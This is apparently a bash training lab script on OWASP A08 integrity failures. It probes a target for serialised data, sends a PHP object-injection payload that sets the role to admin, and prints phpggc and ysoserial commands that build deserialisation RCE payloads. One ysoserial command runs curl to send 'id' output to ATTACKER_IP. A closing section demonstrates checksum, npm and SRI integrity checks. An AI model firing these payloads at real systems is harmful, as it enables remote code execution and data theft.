#!/bin/bash
# ============================================================
# A08:2021 — Software and Data Integrity Failures
# Kali Linux Attack & Analysis Script
# ============================================================
# Tools used: curl, python3, ysoserial (Java), openssl
# Usage: bash a08_integrity_failures.sh
# ============================================================

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

TARGET="http://TARGET_IP_OR_DOMAIN"

echo -e "${CYAN}${BOLD}"
echo "╔══════════════════════════════════════════════════╗"
echo "║  A08:2021 — Integrity Failures Lab              ║"
echo "╚══════════════════════════════════════════════════╝${NC}"
echo ""

mkdir -p /tmp/a08_demo

# ─────────────────────────────────────────────
# SECTION 1: Detecting Serialised Data in Requests
# ─────────────────────────────────────────────
echo -e "${BOLD}[1] Detecting Serialised Data in HTTP Traffic${NC}"
echo -e "${YELLOW}    Identifying endpoints that accept serialised Java, PHP, or Python objects${NC}"
echo ""

echo -e "    ${CYAN}[1a] Java serialisation magic bytes (rO0AB = base64 of 0xACED0005):${NC}"
echo ""

# Fetch multiple pages and look for serialised data hints
JAVA_MAGIC="rO0AB"  # base64 encoded Java serialisation magic bytes (0xACED0005)
PHP_SERIAL_PATTERN='[OoAaCcSs]:[0-9]+:'
PICKLE_PATTERN="80 0[2-5]"   # Python pickle opcodes

echo -e "    Checking cookies and forms for serialised data..."
COOKIES=$(curl -s -I --max-time 10 "$TARGET" 2>/dev/null | grep -i "Set-Cookie")
if echo "$COOKIES" | grep -q "$JAVA_MAGIC"; then
  echo -e "    ${RED}[JAVA SERIAL!]${NC} Java serialised object found in cookie!"
  echo "$COOKIES" | grep "$JAVA_MAGIC"
elif echo "$COOKIES" | grep -qP "$PHP_SERIAL_PATTERN"; then
  echo -e "    ${RED}[PHP SERIAL!]${NC} PHP serialised object found in cookie!"
else
  echo -e "    [OK] No serialised objects detected in cookies."
fi
echo ""

echo -e "    ${CYAN}[1b] PHP serialisation detection in URL parameters:${NC}"
echo ""
PHP_SERIAL_TEST_URL="$TARGET/profile?data=O:8:\"stdClass\":1:{s:4:\"role\";s:5:\"admin\";}"
STATUS=$(curl -s -o /dev/null -w "%{http_code}" --max-time 10 "$PHP_SERIAL_TEST_URL" 2>/dev/null)
echo -e "    Sent PHP serialised payload. HTTP Status: $STATUS"
echo -e "    ${YELLOW}[TIP] A 500 error may indicate the server tried to unserialize the input.${NC}"
echo ""

# ─────────────────────────────────────────────
# SECTION 2: PHP Deserialization Attack
# ─────────────────────────────────────────────
echo -e "${BOLD}[2] PHP Deserialization — Object Injection${NC}"
echo -e "${YELLOW}    Crafting malicious PHP serialised objects to exploit magic methods${NC}"
echo ""

echo -e "    ${CYAN}[2a] PHP serialisation format reference:${NC}"
cat << 'EOF'
    s:6:"foobar";         → string of length 6: "foobar"
    i:42;                 → integer 42
    b:1;                  → boolean true
    O:9:"ClassName":1:{   → object of class "ClassName" with 1 property
      s:4:"name";         → property name (string, length 4)
      s:5:"value";        → property value (string, length 5)
    }
    a:2:{i:0;s:5:"hello";i:1;s:5:"world";} → array with 2 elements
EOF
echo ""

echo -e "    ${CYAN}[2b] Classic PHP Object Injection — privilege escalation payload:${NC}"
echo ""

# Example: escalate role to "admin" via serialised object
PHP_ADMIN_PAYLOAD=$(python3 -c "
import base64
# Serialize: O:4:\"User\":1:{s:4:\"role\";s:5:\"admin\";}
serialized = 'O:4:\"User\":1:{s:4:\"role\";s:5:\"admin\";}'
print('Raw payload:', serialized)
print('URL-encoded:', serialized.replace('\"', '%22').replace('{', '%7B').replace('}', '%7D'))
print('Base64:', base64.b64encode(serialized.encode()).decode())
" 2>/dev/null)
echo -e "    $PHP_ADMIN_PAYLOAD"
echo ""

echo -e "    ${CYAN}[2c] phpggc — PHP Generic Gadget Chains (auto-generate exploit payloads):${NC}"
echo ""
echo -e "    ${YELLOW}# Install phpggc:${NC}"
echo -e "    ${BOLD}git clone https://github.com/ambionics/phpggc.git /opt/phpggc${NC}"
echo ""
echo -e "    ${YELLOW}# List available gadget chains for a specific framework:${NC}"
echo -e "    ${BOLD}/opt/phpggc/phpggc -l | grep -i laravel${NC}"
echo -e "    ${BOLD}/opt/phpggc/phpggc -l | grep -i symfony${NC}"
echo ""
echo -e "    ${YELLOW}# Generate RCE payload for Laravel (example — requires vulnerable gadget chain):${NC}"
echo -e "    ${BOLD}/opt/phpggc/phpggc Laravel/RCE1 system 'id' | base64${NC}"
echo ""
echo -e "    ${YELLOW}# Send the payload to a vulnerable endpoint:${NC}"
echo -e "    ${BOLD}curl -s -b \"session=\$(phpggc Laravel/RCE1 system 'id' | base64)\" $TARGET/profile${NC}"
echo ""

# ─────────────────────────────────────────────
# SECTION 3: Java Deserialization
# ─────────────────────────────────────────────
echo -e "${BOLD}[3] Java Deserialization Attack${NC}"
echo -e "${YELLOW}    Using ysoserial to generate gadget chain payloads${NC}"
echo ""

echo -e "    ${CYAN}[3a] ysoserial — Java deserialization exploit generator:${NC}"
echo ""
echo -e "    ${YELLOW}# Download ysoserial:${NC}"
echo -e "    ${BOLD}wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar -O /opt/ysoserial.jar${NC}"
echo ""
echo -e "    ${YELLOW}# List available gadget chains:${NC}"
echo -e "    ${BOLD}java -jar /opt/ysoserial.jar --help 2>&1 | head -30${NC}"
echo ""
echo -e "    ${YELLOW}# Generate a payload using CommonsCollections1 (curl our server on exec):${NC}"
echo -e "    ${BOLD}java -jar /opt/ysoserial.jar CommonsCollections1 'curl http://ATTACKER_IP/rce?pwn=\$(id)' > /tmp/a08_demo/payload_cc1.bin${NC}"
echo ""
echo -e "    ${YELLOW}# Generate a base64-encoded payload:${NC}"
echo -e "    ${BOLD}java -jar /opt/ysoserial.jar CommonsCollections6 'id' | base64 > /tmp/a08_demo/payload_b64.txt${NC}"
echo ""
echo -e "    ${YELLOW}# Send to a Java endpoint that deserializes POST body:${NC}"
echo -e "    ${BOLD}curl -s -X POST --data-binary @/tmp/a08_demo/payload_cc1.bin \\${NC}"
echo -e "    ${BOLD}  -H 'Content-Type: application/x-java-serialized-object' \\${NC}"
echo -e "    ${BOLD}  $TARGET/api/deserialize${NC}"
echo ""
echo -e "    ${YELLOW}Common gadget chains by library:${NC}"
printf "    %-30s %s\n" "Library" "Chain Name"
printf "    %-30s %s\n" "-------" "----------"
printf "    %-30s %s\n" "Apache Commons Collections" "CommonsCollections1 through 7"
printf "    %-30s %s\n" "Spring Framework" "Spring1, Spring2"
printf "    %-30s %s\n" "JBoss/Hibernate" "Jdk7u21, Groovy1"
printf "    %-30s %s\n" "Apache MyFaces JSF" "MozillaRhino1, MozillaRhino2"
echo ""

# ─────────────────────────────────────────────
# SECTION 4: Package Integrity Verification
# ─────────────────────────────────────────────
echo -e "${BOLD}[4] Package Integrity Verification (Defence Demo)${NC}"
echo -e "${YELLOW}    Demonstrating checksum verification to detect tampered downloads${NC}"
echo ""

echo -e "    ${CYAN}[4a] Verify a downloaded file with SHA-256:${NC}"
echo ""
# Create a test file
echo "This is a legitimate package" > /tmp/a08_demo/test_package.txt
LEGITIMATE_HASH=$(sha256sum /tmp/a08_demo/test_package.txt | cut -d' ' -f1)
echo -e "    Original file hash: ${GREEN}$LEGITIMATE_HASH${NC}"

# Simulate tampering
echo "This package has been tampered with by an attacker" > /tmp/a08_demo/tampered_package.txt
TAMPERED_HASH=$(sha256sum /tmp/a08_demo/tampered_package.txt | cut -d' ' -f1)
echo -e "    Tampered file hash: ${RED}$TAMPERED_HASH${NC}"

if [ "$LEGITIMATE_HASH" == "$TAMPERED_HASH" ]; then
  echo -e "    ${GREEN}Hashes match — file is authentic${NC}"
else
  echo -e "    ${RED}[ALERT!] Hash mismatch — file may have been tampered with!${NC}"
fi
echo ""

echo -e "    ${CYAN}[4b] Verify npm package integrity (lockfile check):${NC}"
echo -e "    ${BOLD}npm ci              # uses package-lock.json for exact, verified installs${NC}"
echo -e "    ${BOLD}npm audit           # check for known vulnerabilities${NC}"
echo ""

echo -e "    ${CYAN}[4c] SRI hash generation for browser scripts:${NC}"
echo ""
SCRIPT_URL="https://code.jquery.com/jquery-3.7.1.min.js"
echo -e "    ${YELLOW}# Generate SRI hash for an external script (openssl):${NC}"
echo -e "    ${BOLD}curl -s $SCRIPT_URL | openssl dgst -sha384 -binary | openssl base64 -A${NC}"
echo ""
SRI_HASH=$(curl -s --max-time 15 "$SCRIPT_URL" 2>/dev/null | openssl dgst -sha384 -binary 2>/dev/null | openssl base64 -A 2>/dev/null)
if [ -n "$SRI_HASH" ]; then
  echo -e "    SRI for jQuery 3.7.1:"
  echo -e "    ${GREEN}<script src=\"$SCRIPT_URL\"${NC}"
  echo -e "    ${GREEN}        integrity=\"sha384-${SRI_HASH}\"${NC}"
  echo -e "    ${GREEN}        crossorigin=\"anonymous\"></script>${NC}"
else
  echo -e "    ${YELLOW}[!] Could not fetch jQuery to generate SRI hash.${NC}"
fi
echo ""

echo -e "${CYAN}${BOLD}[A08 Complete]${NC} Document all serialisation endpoints and verify package integrity procedures."
echo ""
